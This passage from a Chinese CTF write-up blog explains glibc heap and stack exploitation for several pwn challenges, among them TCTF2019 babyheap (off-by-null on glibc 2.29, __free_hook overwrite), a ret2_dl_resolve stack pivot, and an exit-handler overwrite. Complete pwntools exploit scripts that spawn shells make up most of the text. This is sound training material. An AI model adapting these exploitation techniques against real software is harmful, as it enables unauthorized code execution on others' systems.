'</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"input&gt; "</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Show</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'5'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Delete</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'id&gt; '</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Edit</span><span class="params">(index,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'id&gt; '</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">    p.recvuntil(<span class="string">"input&gt; "</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#leak heap</span></span><br><span class="line">    <span class="comment">#payload = p64(0xfbad1800)+p64(0)*3+"\x00"</span></span><br><span class="line">    <span class="comment">#gdb.attach(p,'b* 0x0000555555554000+0x1536')</span></span><br><span class="line">    <span class="comment">#Edit(-8,payload)</span></span><br><span class="line">    Add(<span class="string">'0'</span>*<span class="number">8</span>)<span class="comment">#0</span></span><br><span class="line">    Add(<span class="string">'1'</span>*<span class="number">8</span>)<span class="comment">#1</span></span><br><span class="line">    Delete(<span class="number">0</span>)</span><br><span class="line">    Delete(<span class="number">1</span>)</span><br><span class="line">    Edit(<span class="number">1</span>,<span class="string">'\x50'</span>)</span><br><span class="line">    Add(<span class="string">'2'</span>*<span class="number">8</span>)<span class="comment">#2</span></span><br><span class="line">    Add(p64(<span class="number">0</span>)+p64(<span class="number">0x421</span>))<span class="comment">#3</span></span><br><span class="line">    Add(<span class="string">'4'</span>*<span class="number">8</span>)<span class="comment">#4</span></span><br><span class="line"></span><br><span class="line">    Delete(<span class="number">1</span>)</span><br><span class="line">    Delete(<span class="number">4</span>)</span><br><span class="line">    Edit(<span class="number">4</span>,<span class="string">'\x70\x96'</span>)</span><br><span class="line">    Add(<span class="string">'5'</span>*<span class="number">8</span>)<span class="comment">#5</span></span><br><span class="line">    Add(p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+<span class="string">'a'</span>*<span class="number">0x10</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>))<span class="comment">#6</span></span><br><span class="line"></span><br><span class="line">    Delete(<span class="number">0</span>)</span><br><span class="line">    Show()</span><br><span class="line">    p.recvuntil(<span class="string">"Maybe a release of ubuntu!\n"</span>)</span><br><span class="line">    libc_base = u64(p.recvline().strip(<span class="string">"\n"</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - libc.sym[<span class="string">'__malloc_hook'</span>] - <span class="number">0x10</span> - <span class="number">0x60</span></span><br><span class="line">    log.success(<span class="string">"libc base =&gt; "</span> + hex(libc_base))</span><br><span class="line">    free_hook = libc_base + libc.sym[<span class="string">'__free_hook'</span>]</span><br><span class="line"></span><br><span class="line">    Delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    Delete(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">    Edit(<span class="number">4</span>,p64(free_hook)[:<span class="number">-2</span>])</span><br><span class="line"></span><br><span class="line">    Add(<span class="string">"/bin/sh\x00"</span>)<span class="comment">#7</span></span><br><span class="line">    Add(p64(libc_base+libc.sym[<span class="string">'system'</span>]))<span class="comment">#8</span></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    Delete(<span class="number">7</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>
<h2 id="TCTF2019"><a href="#TCTF2019" class="headerlink" title="TCTF2019"></a>TCTF2019</h2><h3 id="babyheap"><a href="#babyheap" class="headerlink" title="babyheap"></a>babyheap</h3><h4 id="前言-1"><a href="#前言-1" class="headerlink" title="前言"></a>前言</h4><p>补充一道前两天做2.29的题目，理解跟2.23和2.27的不同</p>
<h4 id="程序逻辑-1"><a href="#程序逻辑-1" class="headerlink" title="程序逻辑"></a>程序逻辑</h4><p>依然是菜单题，功能有Add、Update、Delete、View</p>
<p>Add的size范围为0到0x1000，Update存在off-by-null，程序保护全开</p>
<h4 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>正常有off-by-null我们要构造overlapping chunk，一般来说构造的堆分布如下：</p>
<p>chunk0-&gt;0x88<br>chunk1-&gt;0x68<br>chunk2-&gt;0xf8<br>chunk3(in case to consolidate)</p>
<p>释放chunk1再分配得到chunk1，off-by-null改掉chunk2的prev_size，free(chunk0)和free(chunk2)即可得到一个chunk0~2的大的块，进而overlapped chunk1，这种方式在这里就不太行了，这是因为2.29在unlink前添加了新的检查。<br>对于我们的chunk2，释放的时候会先检查其prev_inuse位，这里被我们改成了0，因此继续判断，根据prev_size寻找到了unlink的目标chunk0(p)，之后的判断chunksize(p) == 0x90，而prev_size == 0x90+0x70，二者不相等，触发error，从而unlink失败。  </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//glibc-2.29 ./malloc/malloc.c _int_free()</span></span><br><span class="line">    <span class="comment">/* consolidate backward */</span></span><br><span class="line">    <span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">      prevsize = prev_size (p);</span><br><span class="line">      size += prevsize;</span><br><span class="line">      p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));</span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize)) <span class="comment">//patch</span></span><br><span class="line">        malloc_printerr (<span class="string">"corrupted size vs. prev_size while consolidating"</span>); <span class="comment">//patch</span></span><br><span class="line">      unlink_chunk (av, p);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>同样在malloc_consolidate中也有相同的检查</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//glibc-2.29 ./malloc/malloc.c static void malloc_consolidate(mstate av)</span></span><br><span class="line">	<span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">	  prevsize = prev_size (p);</span><br><span class="line">	  size += prevsize;</span><br><span class="line">	  p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));</span><br><span class="line">	  <span class="keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))  <span class="comment">//patch</span></span><br><span class="line">	    malloc_printerr (<span class="string">"corrupted size vs. prev_size in fastbins"</span>); <span class="comment">//patch</span></span><br><span class="line">	  unlink_chunk (av, p);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>为了绕过prev_size==chunk_size的检查，我们要自己构造fake_chunk，同时满足这个check以及unlink的检查，这样的构造在有heap地址的时候比较容易，对于手里没地址的情况比较复杂，这个在Balsn CTF2019有题，Ex师傅也写了篇博客分析glibc2.29下的通用off-by-null的通用利用思路，之后会填坑。</p>
<p>首先分配并释放一个unsorted bin，再分配之后利用残留的libc可以得到libc地址。<br>释放两个chunk 1 和 2，2的fd为chunk1的地址(tcache_list)，分配得到2，show(2)即可泄露heap1地址，进而得到堆地址。  </p>
<p>再往后我们还是构造之前的堆分配布局，但不一样的是我们在chunk0中构造fake_chunk，合并的从012变成fake_chunk+1+2。<br>构造的fake_chunk需要满足以下条件:  </p>
<ol>
<li>size: == offset between fake_chunk &amp;&amp; chunk2</li>
<li>fd: some_addr_that_store_fake-chunk-addr - 0x18</li>
<li>bk: fd - 0x8<br>因为我们手里有了heap地址，所以满足上面的条件很容易，最后overlap之后即可通过update修改fd到free_hook从而get shell</li>
</ol>
<h4 id="exp-py-3"><a href="#exp-py-3" class="headerlink" title="exp.py"></a>exp.py</h4><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'DEBUG'</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line">elf = ELF(<span class="string">'./babyheap2.29'</span>)</span><br><span class="line">libc_offset = <span class="number">0x3c4b20</span></span><br><span class="line">gadgets = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">    p = process(<span class="string">'./babyheap2.29'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc = ELF(<span class="string">'./x64_libc.so.6'</span>)</span><br><span class="line">    p = remote(<span class="string">'f.buuoj.cn'</span>,<span class="number">20173</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Alloc</span><span class="params">(size)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Command: '</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Size: "</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Update</span><span class="params">(index,size,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Command: '</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">    p.recvuntil(<span class="string">"Size: "</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">"Content: "</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Delete</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Command: '</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Show</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Command: '</span>)</span><br><span class="line">    p.sendline(<span class="string">'4'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#leak libc</span></span><br><span class="line">    Alloc(<span class="number">0x420</span>)<span class="comment">#0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">        Alloc(<span class="number">0xf8</span>)<span class="comment">#1~8</span></span><br><span class="line">    Alloc(<span class="number">0xf8</span>)<span class="comment">#9</span></span><br><span class="line">    Alloc(<span class="number">0xf8</span>)<span class="comment">#10</span></span><br><span class="line">    Alloc(<span class="number">0xf8</span>)<span class="comment">#11</span></span><br><span class="line">    Alloc(<span class="number">0x28</span>)<span class="comment">#12</span></span><br><span class="line">    Delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    Alloc(<span class="number">0x420</span>)<span class="comment">#0</span></span><br><span class="line"></span><br><span class="line">    Show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">"Chunk[0]: "</span>)</span><br><span class="line">    libc_base = u64(p.recvline().strip(<span class="string">'\n'</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">0x60</span> - libc.sym[<span class="string">'__malloc_hook'</span>] - <span class="number">0x10</span></span><br><span class="line">    log.success(<span class="string">"libc base =&gt; "</span> + hex(libc_base))</span><br><span class="line">    <span class="comment">#leak heap</span></span><br><span class="line">    Delete(<span class="number">1</span>)</span><br><span class="line">    Delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    Alloc(<span class="number">0xf8</span>)<span class="comment">#1</span></span><br><span class="line">    Show(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Chunk[1]: "</span>)</span><br><span class="line">    heap_base = u64(p.recvline().strip(<span class="string">'\n'</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">0x690</span></span><br><span class="line">    log.success(<span class="string">"heap base =&gt; "</span> + hex(heap_base))</span><br><span class="line">    <span class="comment">#fill the tcache</span></span><br><span class="line">    Delete(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>,<span class="number">9</span>):</span><br><span class="line">        Delete(i)</span><br><span class="line"></span><br><span class="line">    payload = p64(heap_base+<span class="number">0xe90</span>)*<span class="number">2</span>+<span class="string">'a'</span>*<span class="number">0xe0</span>+p64(<span class="number">0x1f0</span>)</span><br><span class="line">    Update(<span class="number">10</span>,len(payload),payload)</span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    fd = heap_base+<span class="number">0xf80</span></span><br><span class="line">    bk = fd</span><br><span class="line"></span><br><span class="line">    Update(<span class="number">9</span>,<span class="number">0x20</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x1f1</span>)+p64(fd)+p64(bk))</span><br><span class="line"></span><br><span class="line">    Delete(<span class="number">11</span>)<span class="comment">#9+10+11 overlapping with 9 10 11</span></span><br><span class="line">    <span class="comment">#double free</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">        Alloc(<span class="number">0x68</span>)<span class="comment">#1 2 [3,8]</span></span><br><span class="line"></span><br><span class="line">    Delete(<span class="number">1</span>)</span><br><span class="line">    Delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>,<span class="number">4</span>):</span><br><span class="line">        Delete(i)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>,<span class="number">9</span>):</span><br><span class="line">        Delete(i)</span><br><span class="line">    Delete(<span class="number">4</span>)</span><br><span class="line">    libc.address = libc_base</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">        Alloc(<span class="number">0x68</span>)<span class="comment">#1 2 [3,8]</span></span><br><span class="line"></span><br><span class="line">    payload = <span class="string">'a'</span>*<span class="number">0x70</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x71</span>)+p64(libc.sym[<span class="string">'__free_hook'</span>]<span class="number">-0x10</span>)</span><br><span class="line">    Update(<span class="number">9</span>,len(payload),payload)</span><br><span class="line">    Alloc(<span class="number">0x68</span>)<span class="comment">#8</span></span><br><span class="line">    Alloc(<span class="number">0x68</span>)<span class="comment">#11</span></span><br><span class="line">    Update(<span class="number">11</span>,<span class="number">0x8</span>,p64(libc.sym[<span class="string">'system'</span>]))</span><br><span class="line">    Update(<span class="number">8</span>,<span class="number">8</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">    Delete(<span class="number">8</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>
<h2 id="京津冀"><a href="#京津冀" class="headerlink" title="京津冀"></a>京津冀</h2><h3 id="前言-2"><a href="#前言-2" class="headerlink" title="前言"></a>前言</h3><p>让我很难受的一场，ret2_dl_resolve手里没有脚本加上很久没做，中间卡住了就不断换题，最后一道没出，菜的有点过分了。</p>
<h3 id="pwn1-1"><a href="#pwn1-1" class="headerlink" title="pwn1"></a>pwn1</h3><h4 id="程序逻辑-amp-漏洞利用"><a href="#程序逻辑-amp-漏洞利用" class="headerlink" title="程序逻辑&amp;漏洞利用"></a>程序逻辑&amp;漏洞利用</h4><p>第一眼看没什么，看汇编可以发现其实还是溢出了,有点像DDCTF的题，ebp-4的值作为addr，跳转到addr-4的值继续执行。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line"></span><br><span class="line">  read(<span class="number">0</span>, &amp;gift, <span class="number">0x14</span>u);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x14</span>u);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.text:08048448                 mov     ecx, [ebp+var_4]</span><br><span class="line">.text:0804844B                 leave</span><br><span class="line">.text:0804844C                 lea     esp, [ecx-4]</span><br><span class="line">.text:0804844F                 retn</span><br></pre></td></tr></table></figure>
<p>开始的时候我们有0x14字节的输入，可以布置一次read，但是不足以栈迁移到bss。就是在这里卡住了，开始一直找Gadgets跳过去，换题再回来之后发现不需要这样，直接read的地址改成0x14字节后面的地址，这样可以接力部署gadgets和值，也就是说输入为gadgets+padding+data，gadgets负责栈迁移，后面就是ret2_dl_resolve，这种复杂的东西还是要学会用roputils或者自己写模板脚本。</p>
<h4 id="exp-py-4"><a href="#exp-py-4" class="headerlink" title="exp.py"></a>exp.py</h4><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(arch=<span class="string">'i386'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'debug'</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line">elf = ELF(<span class="string">'./stack'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    libc = ELF(<span class="string">'/lib/i386-linux-gnu/libc.so.6'</span>)</span><br><span class="line">    p = process(<span class="string">'./stack'</span>)</span><br><span class="line">    gadgets = [<span class="number">0x3ac5c</span>,<span class="number">0x3ac5e</span>,<span class="number">0x3ac62</span>,<span class="number">0x3ac69</span>,<span class="number">0x5fbc5</span>,<span class="number">0x5fbc6</span>]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    gadgets = [<span class="number">0x3a80c</span>,<span class="number">0x3a80e</span>,<span class="number">0x3a812</span>,<span class="number">0x3a819</span>,<span class="number">0x5f065</span>,<span class="number">0x5f066</span>]</span><br><span class="line">    libc = ELF(<span class="string">'./x86_libc.so.6'</span>)</span><br><span class="line">    p = remote(<span class="string">'f.buuoj.cn'</span>,<span class="number">20171</span>)</span><br><span class="line"></span><br><span class="line">csu_start = <span class="number">0x080484a8</span></span><br><span class="line">csu_end = <span class="number">0x08048488</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">csu</span><span class="params">(ebx,esi,edi,ebp,retn_addr)</span>:</span></span><br><span class="line">    payload = p32(csu_start)+p32(ebx)+p32(esi)+p32(edi)+p32(ebp)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#ebx=call_func</span></span><br><span class="line">    <span class="comment">#esi=1</span></span><br><span class="line">    <span class="comment">#edi=0</span></span><br><span class="line">    <span class="comment">#ebp=arg1</span></span><br><span class="line">    leave_ret = <span class="number">0x08048378</span></span><br><span class="line">    read_got = elf.got[<span class="string">'read'</span>]</span><br><span class="line">    read_plt = elf.plt[<span class="string">'read'</span>]</span><br><span class="line">    libc_start_got = elf.got[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">    bss_base = elf.bss()+<span class="number">0x300</span></span><br><span class="line"></span><br><span class="line">    ret_addr = <span class="number">0x080482b2</span></span><br><span class="line">    leave_ret = <span class="number">0x08048378</span></span><br><span class="line">    p_ebp = <span class="number">0x080484ab</span></span><br><span class="line">    p2_ret = <span class="number">0x080484aa</span></span><br><span class="line">    gift = p32(read_plt)+p32(p2_ret)+p32(<span class="number">0</span>)+p32(<span class="number">0x0804a024</span>)+p32(<span class="number">0x500</span>)</span><br><span class="line">    p.send(gift)</span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    gdb.attach(p,<span class="string">'b* 0x0804844f'</span>)</span><br><span class="line">    p.send(<span class="string">"a"</span>*<span class="number">0x10</span>+p32(<span class="number">0x0804a024</span>))</span><br><span class="line">    <span class="keyword">print</span> hex(bss_base)</span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    dyn_str = <span class="number">0x804821C</span></span><br><span class="line">    <span class="keyword">print</span> hex(dyn_str)</span><br><span class="line">    dyn_sym = <span class="number">0x80481CC</span></span><br><span class="line">    <span class="keyword">print</span> hex(dyn_sym)</span><br><span class="line">    rel_plt = <span class="number">0x8048298</span></span><br><span class="line">    <span class="keyword">print</span> hex(rel_plt)</span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    fake_rel_off = (bss_base+<span class="number">20</span>+<span class="number">4</span>) - rel_plt</span><br><span class="line">    <span class="comment">#rel 0x8 4 bytes padding</span></span><br><span class="line">    fake_got = libc_start_got</span><br><span class="line">    fake_sym_off = (((bss_base+<span class="number">20</span>+<span class="number">4</span>+<span class="number">8</span> - dyn_sym)/ <span class="number">0x10</span>) &lt;&lt; <span class="number">8</span>) + <span class="number">7</span></span><br><span class="line">    fake_rel = p32(fake_got)+p32(fake_sym_off)</span><br><span class="line">    <span class="comment">#sym 0x10</span></span><br><span class="line">    st_name = (bss_base+<span class="number">20</span>+<span class="number">4</span>+<span class="number">8</span>+<span class="number">0x10</span> - dyn_str)</span><br><span class="line">    fake_sym = p32(st_name)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+chr(<span class="number">0x12</span>)+chr(<span class="number">0</span>)+p16(<span class="number">0</span>)</span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    strngs = <span class="string">"system\x00\x00"</span></span><br><span class="line">    strngs += <span class="string">"/bin/sh\x00"</span></span><br><span class="line">    binsh_addr = (bss_base+<span class="number">20</span>+<span class="number">4</span>+<span class="number">8</span>+<span class="number">0x10</span>+<span class="number">8</span>)</span><br><span class="line">    resolve_plt = elf.get_section_by_name(<span class="string">'.plt'</span>).header.sh_addr</span><br><span class="line">    <span class="comment">#rop len == 20</span></span><br><span class="line">    payload = p32(<span class="number">0x080482b2</span>)</span><br><span class="line">    payload += p32(resolve_plt)+p32(fake_rel_off)+<span class="string">'a'</span>*<span class="number">4</span>+p32(binsh_addr)</span><br><span class="line">    buf = payload</span><br><span class="line">    buf += <span class="string">'a'</span>*<span class="number">4</span><span class="comment">#pad</span></span><br><span class="line">    buf += fake_rel</span><br><span class="line">    buf += fake_sym</span><br><span class="line">    buf += strngs</span><br><span class="line"></span><br><span class="line">    raw_input()</span><br><span class="line">    p.send(p32(p_ebp)+p32(bss_base)+p32(leave_ret)+<span class="string">'a'</span>*<span class="number">0x2ec</span>+buf)</span><br><span class="line">    <span class="comment">#p.send(buf)</span></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>
<h3 id="pwn2-1"><a href="#pwn2-1" class="headerlink" title="pwn2"></a>pwn2</h3><h4 id="程序逻辑-amp-漏洞利用-1"><a href="#程序逻辑-amp-漏洞利用-1" class="headerlink" title="程序逻辑 &amp; 漏洞利用"></a>程序逻辑 &amp; 漏洞利用</h4><p>pwn2 其实是最近很流行的exit利用的一种，xctf的时候我成功利用过一次，当时比赛的时候由于ld.so没给，libc和ld的偏移也没确定，远程失败，这次大概猜到最后的利用链，但是还是没想明白怎么泄露地址。</p>
<p>题目为libc 2.27，一共有7次写的机会。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl __noreturn <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+3h] [rbp-2Dh]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+4h] [rbp-2Ch]</span></span><br><span class="line">  <span class="keyword">size_t</span> size; <span class="comment">// [rsp+8h] [rbp-28h]</span></span><br><span class="line">  _BYTE *chunk_addr; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  __int64 idx; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">char</span> num_buf; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v9; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v9 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setbuf(_bss_start, <span class="number">0L</span>L);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L);</span><br><span class="line">  __isoc99_scanf(&amp;unk_B54, &amp;size);</span><br><span class="line">  chunk_addr = <span class="built_in">malloc</span>(size);</span><br><span class="line">  <span class="keyword">if</span> ( !chunk_addr )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">7777</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; (<span class="keyword">signed</span> <span class="keyword">int</span>)i &lt;= <span class="number">6</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d\n"</span>, i);</span><br><span class="line">    <span class="built_in">memset</span>(&amp;num_buf, <span class="number">0</span>, <span class="number">8u</span>LL);</span><br><span class="line">    read(<span class="number">0</span>, &amp;num_buf, <span class="number">8u</span>LL);</span><br><span class="line">    read(<span class="number">0</span>, &amp;buf, <span class="number">1u</span>LL);</span><br><span class="line">    idx = get_num((__int64)&amp;num_buf);</span><br><span class="line">    chunk_addr[idx] = buf;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">7777</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>泄露方法是分配一块极大size的heap，这种利用在之前的Hitcon出现过，最后map的地址用来存放堆，给定一个size，map和libc的偏移是一定的。我们可以分配一块极大的heap，通过两次写改掉_IO_2_1_stdut_的_flags和_IO_write_base泄露libc。</p>
<p>后面需要了解exit的调用过程，在HCTF-the end中可以看到最后调用_dl_fini，一直跟下去，会发现有几次调用<code>_rtld_global+3848</code>，前面lea rdi设置的参数在<code>_rtld_global+2312</code></p>
<p><img src="/2020/09/03/hxb_jjj_axb_swpuctf/jjj_pwn2_1.png" alt="call"></p>
<p>因此用3次写函数指针的后三位为syetem函数后三位(本身就是一个libc相关的地址)，再两字节改参数为’sh’，最后即可调用system(“sh”)，这里的_rtld_global是ld中的符号，我是直接调试的，题目给了ld，也可以用ld.sym再计算偏移(和heap以及libc的偏移也是固定的)</p>
<h4 id="exp-py-5"><a href="#exp-py-5" class="headerlink" title="exp.py"></a>exp.py</h4><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'info'</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line">elf = ELF(<span class="string">'./heap'</span>)</span><br><span class="line">libc_offset = <span class="number">0x3c4b20</span></span><br><span class="line">gadgets = [<span class="number">0x4f2c5</span>,<span class="number">0x4f322</span>,<span class="number">0x10a38c</span>]</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">    p = process(<span class="string">'./heap'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc = ELF(<span class="string">'./libc-2.27.so'</span>)</span><br><span class="line">    p = remote(<span class="string">'f.buuoj.cn'</span>,<span class="number">20173</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Add</span><span class="params">(size,name,call)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'choice:'</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span 